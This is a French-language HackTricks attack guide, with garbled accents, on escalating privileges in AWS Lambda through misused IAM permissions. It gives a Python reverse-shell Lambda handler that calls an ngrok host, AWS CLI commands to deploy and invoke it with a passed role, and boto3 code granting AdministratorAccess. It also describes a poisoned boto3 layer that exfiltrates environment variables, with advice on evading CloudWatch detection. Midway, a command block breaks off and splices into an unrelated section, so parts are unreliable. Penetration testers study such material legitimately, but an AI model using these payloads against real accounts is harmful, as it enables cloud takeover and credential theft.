# AWS - Privil√®ge d'escalade Lambda

<details>

<summary><strong>Soutenez HackTricks et b√©n√©ficiez d'avantages !</strong></summary>

* Si vous souhaitez voir votre **entreprise annonc√©e dans HackTricks** ou si vous souhaitez acc√©der √† la **derni√®re version de PEASS ou t√©l√©charger HackTricks en PDF**, consultez les [**PLANS D'ABONNEMENT**](https://github.com/sponsors/carlospolop)!
* Obtenez le [**swag officiel PEASS & HackTricks**](https://peass.creator-spring.com)
* D√©couvrez [**The PEASS Family**](https://opensea.io/collection/the-peass-family), notre collection d'[**NFTs**](https://opensea.io/collection/the-peass-family) exclusifs
* **Rejoignez** üí¨ [**le groupe Discord**](https://discord.gg/hRep4RUj7f) ou le [**groupe Telegram**](https://t.me/peass) ou **suivez** moi sur **Twitter** üê¶ [**@carlospolopm**](https://twitter.com/carlospolopm).

</details>

## lambda

Plus d'informations sur lambda dans :

{% content-ref url="../../aws-security/aws-services/aws-lambda-enum.md" %}
[aws-lambda-enum.md](../../aws-security/aws-services/aws-lambda-enum.md)
{% endcontent-ref %}

### `iam:PassRole`, `lambda:CreateFunction`, (`lambda:InvokeFunction` | `lambda:InvokeFunctionUrl`)

Un utilisateur ayant les autorisations **`iam:PassRole`, `lambda:CreateFunction`** et **`lambda:InvokeFunction`** peut **escalader les privil√®ges en passant un r√¥le IAM existant √† une nouvelle fonction Lambda** qui inclut du code pour importer la biblioth√®que AWS pertinente dans leur langage de programmation pr√©f√©r√©, puis l'utiliser pour effectuer des actions de leur choix. Le code pourrait ensuite √™tre ex√©cut√© en invoquant la fonction via l'API AWS.

Un attaquant pourrait exploiter cela pour obtenir un **shell invers√© et voler le jeton** :

{% code title="rev.py" %}
```python
import socket,subprocess,os,time
def lambda_handler(event, context):
   s = socket.socket(socket.AF_INET,socket.SOCK_STREAM);
   s.connect(('4.tcp.ngrok.io',14305))
   os.dup2(s.fileno(),0)
   os.dup2(s.fileno(),1)
   os.dup2(s.fileno(),2)
   p=subprocess.call(['/bin/sh','-i'])
   time.sleep(900)
   return 0
```
{% endcode %}

```bash
# Zip le shell invers√©
zip "rev.zip" "rev.py"

# Cr√©er la fonction
aws lambda create-function --function-name my_function \
    --runtime python3.9 --role <arn_of_lambda_role> \
    --handler rev.lambda_handler --zip-file fileb://rev.zip

# Invoquer la fonction
aws lambda invoke --function-name my_function output.txt
## Si vous avez la permission lambda:InvokeFunctionUrl, vous devez exposer la fonction dans une URL et l'ex√©cuter via l'URL

# Liste des r√¥les
aws iam list-attached-user-policies --user-name <user-name>
```

Vous pouvez √©galement **exploiter les autorisations de r√¥le lambda** √† partir de la fonction lambda elle-m√™me.\
Si le r√¥le lambda avait suffisamment d'autorisations, vous pourriez l'utiliser pour vous accorder des droits d'administrateur :

```python
import boto3
def lambda_handler(event, context):
    client = boto3.client('iam')
    response = client.attach_user_policy(
        UserName='my_username',
        PolicyArn='arn:aws:iam::aws:policy/AdministratorAccess'
    )
    return response
```

**Impact potentiel :** Privil√®ge d'escalade direct vers le r√¥le de service lambda sp√©cifi√©.

{% hint style="danger" %}
Notez que m√™me s'il peut sembler int√©ressant, **`lambda:InvokeAsync`** ne permet pas √† lui seul d'ex√©cuter `aws lambda invoke-async`, vous avez √©galement besoin de `lambda:InvokeFunction`
{% endhint %}

### `iam:PassRole`, `lambda:CreateFunction`, `lambda:AddPermission`

Comme dans le sc√©nario pr√©c√©dent, vous pouvez **vous accorder la permission `lambda:InvokeFunction`** si vous avez la permission **`lambda:AddPermission`**

```bash
# V√©rifiez l'exploit pr√©c√©dent et utilisez la ligne suivante pour vous accorder les autorisations d'invocation
aws --profile "$NON_PRIV_PROFILE_USER" lambda add-permission --function-name my_function \
   --action lambda:InvokeFunction --statement-id statement_privesc --principal "$NON_PRIV_PROFILE_USER_ARN"
```

**Impact potentiel :** Privil√®ge d'escalade direct vers le r√¥le de service lambda sp√©cifi√©.

### `iam:PassRole`, `lambda:CreateFunction`, `lambda:CreateEventSourceMapping`

Un utilisateur ayant les autorisations **`iam:PassRole`, `lambda:CreateFunction` et `lambda:CreateEventSourceMapping`** (et √©ventuellement `dynamodb:PutItem` et `dynamodb:CreateTable`), mais **sans** la permission `lambda:InvokeFunction`, peut escalader les privil√®ges en **passant un r√¥le IAM existant √† une nouvelle fonction Lambda** qui inclut du code pour importer la biblioth√®que AWS pertinente dans leur langage de programmation pr√©f√©r√©, puis l'utiliser pour effectuer des actions de leur choix. Ils devront ensuite soit **cr√©er une table DynamoDB ou utiliser une table existante**, pour **cr√©er un mappage de source d'√©v√©nements pour la fonction Lambda pointant vers cette table DynamoDB**. Ensuite, ils devront soit mettre un √©l√©ment dans la table, soit attendre qu'une autre m√©thode le fasse pour que la **fonction Lambda soit invoqu√©e**.

```bash
aws lambda create-function --function-name my_function \
    --runtime python3.8 --role <arn_of_lambda_role> \
    --handler lambda_function.lambda_handler \
    --zip-file fileb://rev.zip
```

O√π le **code** dans le fichier python **utilise le r√¥le cibl√©**. Un exemple serait le m√™me script utilis√© dans les m√©thodes pr√©c√©dentes.

Apr√®s cela, la prochaine √©tape d√©pend de **l'utilisation de DynamoDB** dans l'environnement AWS actuel. **Si** elle est **utilis√©e**, tout ce qui doit √™tre fait est de **cr√©er le mappage de source d'√©v√©nements** pour la fonction Lambda, mais si ce n'est pas le cas, l'attaquant devra **cr√©er une table avec le streaming activ√©** avec la commande suivante :

```bash
aws dynamodb create-table --table-name my_table \
    --attribute-definitions AttributeName=Test,AttributeType=S \
    --key-schema AttributeName=Test,KeyType=HASH \
    --provisioned-throughput ReadCapacityUnits=5
#### Exploitation

**Attacher une couche √† une fonction** ne n√©cessite que l'autorisation `lambda:UpdateFunctionConfiguration` et **les couches peuvent √™tre partag√©es entre les comptes**. Nous devons √©galement savoir **quelles biblioth√®ques ils utilisent**, afin que nous puissions les remplacer correctement, mais dans cet exemple, nous allons simplement **supposer que la fonction attaqu√©e importe boto3**.

Pour √™tre s√ªr, nous allons utiliser Pip pour installer la m√™me version de la biblioth√®que boto3 √† partir de l'ex√©cution Lambda que nous ciblons (Python 3.7), juste pour qu'il n'y ait rien de diff√©rent qui pourrait causer des probl√®mes dans la fonction cible. Cette ex√©cution utilise actuellement la version 1.9.42 de boto3.

Avec le code suivant, nous installerons la version 1.9.42 de boto3 et ses d√©pendances dans un dossier local "lambda\_layer":

```
pip3 install -t ./lambda_layer boto3==1.9.42
```

Ensuite, nous ouvrirons `/lambda_layer/boto3/__init__.py` et ajouterons le code malveillant. La charge utile que nous allons ajouter ressemble √† ceci:

![](<../../../.gitbook/assets/image (26).png>)

`requests` est import√© de `botocore`. La fonction exfiltrera les variables d'environnement, et le try-except et le d√©lai de 0,1 sont l√† pour s'assurer que ce code ne casse rien.

{% hint style="info" %}
**Note importante:** Vous ne devriez plus utiliser `from botocore.vendored import requests` dans de vrais tests de p√©n√©tration, car un "DeprecationWarning" sera imprim√© dans les journaux CloudWatch de cette fonction, ce qui risque de vous faire rep√©rer par un d√©fenseur.
{% endhint %}

Maintenant, regroupez ce code dans un **fichier ZIP** et **t√©l√©chargez-le** dans une **nouvelle couche Lambda dans le compte ATTAQUANT**. Vous devrez d'abord cr√©er un dossier "python" et y mettre vos biblioth√®ques afin que, une fois que nous l'aurons t√©l√©charg√© dans Lambda, le code sera trouv√© √† "/opt/python/boto3". Assurez-vous √©galement que la couche est compatible avec Python 3.7 et que **la couche est dans la m√™me r√©gion que notre fonction cible**. Une fois cela fait, nous utiliserons `lambda:AddLayerVersionPermission` pour **rendre la couche publiquement accessible** afin que notre compte cible puisse l'utiliser. Utilisez vos informations d'identification AWS personnelles pour cet appel API.

```bash
aws lambda add-layer-version-permission --layer-name boto3 \
    --version-number 1 --statement-id public \
    --action lambda:GetLayerVersion --principal *
```

Maintenant, avec les **informations d'identification compromises** que nous avons, nous ex√©cuterons la commande suivante sur notre fonction Lambda cible "s3-getter", qui **attachera notre couche Lambda inter-comptes**.

```
aws lambda update-function-configuration \
    --function-name s3-getter \
    --layers arn:aws:lambda:REGION:OUR-ACCOUNT-ID:layer:boto3:1
```

L'√©tape suivante consisterait √† **appeler la fonction** nous-m√™mes si nous le pouvons ou √† attendre qu'elle soit appel√©e par des moyens normaux - ce qui est la m√©thode la plus s√ªre.

Une **mani√®re plus discr√®te d'exploiter cette vuln√©rabilit√©** peut √™tre trouv√©e dans:

{% content-ref url="../aws-persistence/aws-lambda-persistence/aws-lambda-layers-persistence.md" %}
[aws-lambda-layers-persistence.md](../aws-persistence/aws-lambda-persistence/aws-lambda-layers-persistence.md)
{% endcontent-ref %}

**Impact potentiel:** Privil√®ge direct d'acc√®s au r√¥le de service lambda utilis√©.

### `?iam:PassRole`, `lambda:CreateFunction`, `lambda:CreateFunctionUrlConfig`, `lambda:InvokeFunctionUrl`

Peut-√™tre qu'avec ces autorisations, vous pouvez cr√©er une fonction et l'ex√©cuter en appelant l'URL... mais je n'ai pas trouv√© de moyen de le tester, alors faites-le moi savoir si vous le faites !

### Lambda MitM

Certaines fonctions Lambda vont **recevoir des informations sensibles des utilisateurs dans les param√®tres**. Si vous obtenez une RCE dans l'une d'entre elles, vous pouvez exfiltrer les informations que d'autres utilisateurs lui envoient, v√©rifiez-le dans:

{% content-ref url="../aws-post-exploitation/aws-lambda-post-exploitation/aws-warm-lambda-persistence.md" %}
[aws-warm-lambda-persistence.md](../aws-post-exploitation/aws-lambda-post-exploitation/aws-warm-lambda-persistence.md)
{% endcontent-ref %}

<details>

<summary><strong>Soutenez HackTricks et obtenez des avantages !</strong></summary>

* Si vous voulez voir votre **entreprise annonc√©e dans HackTricks** ou si vous voulez acc√©der √† la **derni√®re version de PEASS ou t√©l√©charger HackTricks en PDF** Consultez les [**PLANS D'ABONNEMENT**](https://github.com/sponsors/carlospolop)!
* Obtenez le [**swag officiel PEASS & HackTricks**](https://peass.creator-spring.com)
* D√©couvrez [**The PEASS Family**](https://opensea.io/collection/the-peass-family), notre collection d'[**NFTs**](https://opensea.io/collection/the-peass-family) exclusifs
* **Rejoignez** üí¨ [**le groupe Discord**](https://discord.gg/hRep4RUj7f) ou le [**groupe telegram**](https://t.me/peass) ou **suivez** moi sur **Twitter** üê¶ [**@carlospolopm**](https://twitter.com/carlospolopm).
* **Partagez vos astuces de piratage en soumettant des PR aux** [**HackTricks**](https://github.com/carlospolop/hacktricks) et [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github repos.

</details>